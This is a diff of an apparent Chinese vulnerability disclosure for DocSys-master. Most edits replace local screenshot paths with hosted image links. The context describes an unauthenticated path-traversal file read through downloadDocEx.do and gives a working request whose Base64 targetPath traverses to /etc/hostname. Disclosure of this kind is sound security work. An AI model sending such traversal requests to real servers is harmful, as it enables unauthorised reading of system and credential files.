@@ -30,17 +30,17 @@ DocSys-master（最新版本）
 
 用户请求参数 targetPath 和 targetName 直接来自 HTTP 请求，无认证检查
 
-![image-20260803185644271](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803185644271.png)
+![image-20260803185644271](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803185644271.5q84opwjsi.webp)
 
 3067-3085 — Base64 解码，无任何路径校验，3092 行直接传给文件读取方法
 
-![image-20260803185823627](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803185823627.png)
+![image-20260803185823627](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803185823627.46eauvuk0.webp)
 
 src/com/DocSystem/controller/BaseController.java
 
 第2338行直接调用文件输入输出流实现读取文件
 
-![image-20260803190623579](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803190623579.png)
+![image-20260803190623579](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803190623579.77e9qh21ya.webp)
 
 ---
 
@@ -58,7 +58,7 @@ Connection: keep-alive
 Content-Length: 2
 ```
 
-![image-20260803181622078](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803181622078.png)
+![image-20260803181622078](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803181622078.7p4bf23ob0.webp)
 
 读取/etc/hostname
 
@@ -66,4 +66,4 @@ Content-Length: 2
 /DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL2hvc3RuYW1l&targetName=
 ```
 
-![image-20260803181729829](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260803181729829.png)
+![image-20260803181729829](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803181729829.4ubn99orj5.webp)
